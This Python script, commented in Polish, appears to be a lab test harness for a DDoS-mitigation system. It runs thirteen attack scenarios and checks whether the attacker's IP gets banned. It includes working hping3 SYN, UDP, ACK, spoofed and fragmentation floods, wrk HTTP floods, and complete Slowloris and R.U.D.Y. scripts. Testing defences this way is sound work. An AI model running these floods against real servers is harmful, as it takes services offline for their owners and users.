#!/usr/bin/env python3
import subprocess
import time
import sys
import os

# --- KONFIGURACJA ---
SERVER_IP = "10.0.0.1"
HTTP_URL = f"http://{SERVER_IP}/"
ATTACKER_IP = "10.0.0.2" # Główne IP atakującego
LEGIT_IP = "10.0.0.3"    # Dodatkowe IP do symulacji legalnego ruchu

# ANSI Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

results = []

def run_cmd(cmd, bg=False):
    """Wykonuje polecenie w powłoce systemowej maszyny atakującego."""
    if isinstance(cmd, str):
        cmd = cmd.split()
    if bg:
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        try:
            return subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        except subprocess.TimeoutExpired as e:
            return e

def get_egress_interface():
    """Wykrywa interfejs sieciowy używany do komunikacji z serwerem."""
    res = run_cmd(f"ip route get {SERVER_IP}")
    if isinstance(res, subprocess.CompletedProcess) and res.returncode == 0:
        parts = res.stdout.split()
        if "dev" in parts:
            idx = parts.index("dev")
            return parts[idx + 1]
    return "enp0s8" # Fallback

def is_banned(source_ip=None):
    """Weryfikuje blokadę poprzez próbę wysłania pakietu Ping do serwera."""
    cmd = f"ping -c 2 -W 1 {SERVER_IP}"
    if source_ip:
        cmd = f"ping -c 2 -W 1 -I {source_ip} {SERVER_IP}"
    res = run_cmd(cmd)
    return res.returncode != 0

def prompt_reset():
    """Oczekuje na zresetowanie serwera przed kolejnym testem."""
    print(f"\n{CYAN}[!] Zresetuj środowisko na Serwerze (zrestartuj control_plane.py){RESET}")
    input(f"{BOLD}{YELLOW}Naciśnij ENTER, gdy serwer będzie gotowy...{RESET}")

def report(scenario, status):
    print(f"[{status}] {scenario}")
    results.append([scenario, status])

# =======================================================================
# SCENARIUSZE TESTOWE
# =======================================================================

def test_l4_syn_flood():
    print(f"\n{YELLOW}--- Scenariusz 1: High-Rate L4 SYN Flood ---{RESET}")
    prompt_reset()
    print("[*] Generowanie ruchu SYN Flood (hping3)...")
    proc = run_cmd(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", bg=True)
    time.sleep(5)
    proc.kill()
    
    if is_banned():
        report("1: L4 SYN Flood", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("1: L4 SYN Flood", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_http_flood():
    print(f"\n{YELLOW}--- Scenariusz 2: L7 High-Frequency HTTP Flood ---{RESET}")
    prompt_reset()
    print("[*] Generowanie ruchu HTTP Flood (wrk)...")
    proc = run_cmd(f"wrk -t4 -c100 -d10s {HTTP_URL}", bg=True)
    time.sleep(12)
    proc.kill()
    
    if is_banned():
        report("2: L7 HTTP Flood", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("2: L7 HTTP Flood", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_error_flood():
    print(f"\n{YELLOW}--- Scenariusz 3: L7 Error Flooding (Błędy 404) ---{RESET}")
    prompt_reset()
    print("[*] Generowanie zapytań do nieistniejącego zasobu (wrk)...")
    proc = run_cmd(f"wrk -t4 -c20 -d10s {HTTP_URL}nonexistent_page", bg=True)
    time.sleep(12)
    proc.kill()
    
    if is_banned():
        report("3: L7 Error Flood (404)", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("3: L7 Error Flood (404)", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_gru_stealth_syn():
    print(f"\n{YELLOW}--- Scenariusz 4: Low & Slow SYN Flood (Target GRU ML) ---{RESET}")
    prompt_reset()
    print("[*] Generowanie powolnego ataku SYN Flood (10 pkt/s)...")
    proc = run_cmd(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", bg=True)
    time.sleep(20) # GRU potrzebuje min. 15 żądań
    proc.kill()
    
    if is_banned():
        report("4: Low & Slow SYN (GRU)", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("4: Low & Slow SYN (GRU)", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_slowloris():
    print(f"\n{YELLOW}--- Scenariusz 5: L7 Slowloris Attack ---{RESET}")
    prompt_reset()
    script_path = "/tmp/slowloris_test.py"
    with open(script_path, "w") as f:
        f.write(f"""import socket, random, time
TARGET_IP = "{SERVER_IP}"; PORT = 80; SOCKET_COUNT = 49; sockets = []
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET_IP, PORT))
        s.send(f"GET /?r={{random.randint(0,2000)}} HTTP/1.1\\r\\nHost: {{TARGET_IP}}\\r\\n".encode())
        return s
    except: return None
for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s: sockets.append(s)
while True:
    for s in list(sockets):
        try: s.send(f"X-Keep-Alive: {{random.randint(1, 5000)}}\\r\\n".encode())
        except: sockets.remove(s)
    for _ in range(SOCKET_COUNT - len(sockets)):
        s = create_socket()
        if s: sockets.append(s)
    time.sleep(8)
""")
    print("[*] Wykonywanie skryptu Slowloris...")
    proc = run_cmd(f"python3 {script_path}", bg=True)
    time.sleep(25)
    proc.kill()
    
    if is_banned():
        report("5: L7 Slowloris", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("5: L7 Slowloris", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_benign_traffic():
    print(f"\n{YELLOW}--- Scenariusz 6: Normalny ruch (Benign Baseline) ---{RESET}")
    prompt_reset()
    print("[*] Wysyłanie standardowych żądań HTTP (curl) przez 10 sekund...")
    for _ in range(10):
        run_cmd(f"curl -s -o /dev/null {HTTP_URL}")
        time.sleep(1)
        
    if not is_banned():
        report("6: Benign Traffic", f"{GREEN}BRAK BLOKADY (SUKCES){RESET}")
    else:
        report("6: Benign Traffic", f"{RED}ZABLOKOWANO (FAIL - False Positive){RESET}")

def test_l4_udp_flood():
    print(f"\n{YELLOW}--- Scenariusz 7: High-Rate L4 UDP Flood ---{RESET}")
    prompt_reset()
    print("[*] Generowanie ruchu UDP Flood (hping3)...")
    proc = run_cmd(f"hping3 --udp -p 80 --flood {SERVER_IP}", bg=True)
    time.sleep(10)
    proc.kill()
    
    if is_banned():
        report("7: L4 UDP Flood", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("7: L4 UDP Flood", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_global_spoofed_syn():
    print(f"\n{YELLOW}--- Scenariusz 8: Distributed Spoofed SYN Flood ---{RESET}")
    prompt_reset()
    print("[*] Generowanie SYN Flood z losowych adresów IP (--rand-source)...")
    proc = run_cmd(f"hping3 -S -p 80 --rand-source --flood {SERVER_IP}", bg=True)
    time.sleep(8)
    proc.kill()
    
    # Ponieważ IP są spoofowane, główny IP atakującego NIE zostanie zablokowany.
    # Sprawdzamy jedynie, czy system przetrwał.
    print(f"{CYAN}[!] Sprawdź na serwerze log: '[L4-GLOBAL] ... SYN cookies ENABLED'{RESET}")
    if not is_banned():
        report("8: Spoofed SYN Flood", f"{GREEN}WYKONANO (Sprawdź logi serwera){RESET}")
    else:
        report("8: Spoofed SYN Flood", f"{RED}BŁĄD (Atakujący zablokowany?){RESET}")

def test_mixed_traffic():
    print(f"\n{YELLOW}--- Scenariusz 9: Mixed Traffic (Attacker + Legitimate) ---{RESET}")
    prompt_reset()
    
    iface = get_egress_interface()
    print(f"[*] Dodawanie drugiego IP ({LEGIT_IP}) do interfejsu {iface} dla symulacji...")
    run_cmd(f"ip addr add {LEGIT_IP}/24 dev {iface}")
    
    print("[*] Uruchamianie legalnego klienta (curl w tle)...")
    cmd_legit = f"bash -c 'for i in {{1..25}}; do curl -s --interface {LEGIT_IP} {HTTP_URL} > /dev/null; sleep 1; done'"
    proc_legit = run_cmd(cmd_legit, bg=True)
    
    print("[*] Uruchamianie ataku z głównego IP...")
    proc_attacker = run_cmd(f"hping3 -a {ATTACKER_IP} -S -p 80 -i u100000 {SERVER_IP}", bg=True)
    
    time.sleep(25) # Czekamy na detekcję GRU ML
    proc_attacker.kill()
    proc_legit.kill()
    
    attacker_banned = is_banned(ATTACKER_IP)
    legit_banned = is_banned(LEGIT_IP)
    
    run_cmd(f"ip addr del {LEGIT_IP}/24 dev {iface}") # Cleanup
    
    if attacker_banned and not legit_banned:
        report("9: Mixed Traffic", f"{GREEN}ZABLOKOWANO TYLKO ATAKUJĄCEGO (SUKCES){RESET}")
    else:
        err_msg = "OBA ZABLOKOWANE" if legit_banned else "BRAK BLOKADY"
        report("9: Mixed Traffic", f"{RED}BŁĄD ({err_msg}){RESET}")

def test_l4_ack_flood():
    print(f"\n{YELLOW}--- Scenariusz 10: TCP State Exhaustion (ACK Flood) ---{RESET}")
    prompt_reset()
    print("[*] Generowanie ruchu ACK Flood (hping3)...")
    proc = run_cmd(f"hping3 -A -p 80 --flood {SERVER_IP}", bg=True)
    time.sleep(8)
    proc.kill()
    
    if is_banned():
        report("10: ACK Flood", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("10: ACK Flood", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_rudy():
    print(f"\n{YELLOW}--- Scenariusz 11: L7 Slow POST (R.U.D.Y.) ---{RESET}")
    prompt_reset()
    script_path = "/tmp/rudy_test.py"
    with open(script_path, "w") as f:
        f.write(f"""import socket, random, time
TARGET_IP = "{SERVER_IP}"; PORT = 80; SOCKET_COUNT = 49; sockets = []
def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET_IP, PORT))
        s.send(f"POST /?r={{random.randint(0,2000)}} HTTP/1.1\\r\\nHost: {{TARGET_IP}}\\r\\nContent-Length: 1000000\\r\\n\\r\\n".encode())
        return s
    except: return None
for _ in range(SOCKET_COUNT):
    s = create_socket()
    if s: sockets.append(s)
while True:
    for s in list(sockets):
        try: s.send(b"a")
        except: sockets.remove(s)
    for _ in range(SOCKET_COUNT - len(sockets)):
        s = create_socket()
        if s: sockets.append(s)
    time.sleep(4)
""")
    print("[*] Wykonywanie skryptu R.U.D.Y....")
    proc = run_cmd(f"python3 {script_path}", bg=True)
    time.sleep(25)
    proc.kill()
    
    if is_banned():
        report("11: L7 Slow POST (R.U.D.Y.)", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("11: L7 Slow POST (R.U.D.Y.)", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l7_yoyo():
    print(f"\n{YELLOW}--- Scenariusz 12: L7 Pulsing (Yo-Yo) Attack ---{RESET}")
    prompt_reset()
    script_path = "/tmp/yoyo_test.sh"
    with open(script_path, "w") as f:
        f.write(f"""#!/bin/bash
while true; do
    wrk -t2 -c50 -d2s {HTTP_URL} > /dev/null 2>&1
    sleep 6
done
""")
    os.chmod(script_path, 0o755)
    print("[*] Wykonywanie ataku Yo-Yo (pulsacyjne uderzenia wrk)...")
    proc = run_cmd(f"bash {script_path}", bg=True)
    time.sleep(22)
    proc.kill()
    
    if is_banned():
        report("12: L7 Yo-Yo Attack", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("12: L7 Yo-Yo Attack", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def test_l3_fragmentation():
    print(f"\n{YELLOW}--- Scenariusz 13: L3 IP Fragmentation (Teardrop/Fraggle) ---{RESET}")
    prompt_reset()
    print("[*] Generowanie pofragmentowanych pakietów IP (hping3 -f)...")
    proc = run_cmd(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}", bg=True)
    time.sleep(8)
    proc.kill()
    
    if is_banned():
        report("13: IP Fragmentation", f"{GREEN}ZABLOKOWANO (SUKCES){RESET}")
    else:
        report("13: IP Fragmentation", f"{RED}BRAK BLOKADY (FAIL){RESET}")

def run_all():
    if os.geteuid() != 0:
        print(f"{RED}[-] Skrypt wymaga uprawnień roota (sudo).{RESET}")
        sys.exit(1)
        
    print("[*] Sprawdzanie narzędzi (hping3, wrk, curl)...")
    for t in ["hping3", "wrk", "curl"]:
        if run_cmd(f"which {t}").returncode != 0:
            print(f"{YELLOW}[!] Brak narzędzia {t}. Część testów się nie powiedzie.{RESET}")

    test_l4_syn_flood()
    test_l7_http_flood()
    test_l7_error_flood()
    test_gru_stealth_syn()
    test_l7_slowloris()
    test_benign_traffic()
    test_l4_udp_flood()
    test_global_spoofed_syn()
    test_mixed_traffic()
    test_l4_ack_flood()
    test_l7_rudy()
    test_l7_yoyo()
    test_l3_fragmentation()
    
    print(f"\n{YELLOW}=== PODSUMOWANIE WSZYSTKICH TESTÓW ==={RESET}")
    print(f"{'Scenariusz':<35} | {'Wynik'}")
    print("-" * 65)
    for row in results:
        print(f"{row[0]:<35} | {row[1]}")

if __name__ == "__main__":
    run_all()